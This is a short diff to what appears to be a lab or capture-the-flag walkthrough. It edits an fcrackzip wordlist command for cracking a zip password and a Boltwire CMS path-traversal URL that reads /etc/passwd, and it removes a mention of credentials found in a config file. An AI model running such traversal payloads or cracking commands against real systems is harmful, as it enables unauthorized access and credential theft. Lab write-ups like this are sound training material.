@@ -227,7 +227,7 @@ save.zip
 Password cracking:
 
 ```bash
-fcrackzip -D -p rockyou.txt save.zip
+fcrackzip -u -D -v -p rockyou.txt save.zip
 ```
 
 Contents:
@@ -253,7 +253,7 @@ Research identified an exploit affecting Boltwire CMS.
 Payload:
 
 ```text
-http://TARGET:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd
+http://192.168.126.133:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd
 ```
 
 Result:
@@ -270,12 +270,6 @@ Further enumeration revealed:
 
 ```text
 /app/config/config.yml
-```
-
-The file contained credentials for:
-
-```text
-jeanpaul
 ```
 
 SSH access:
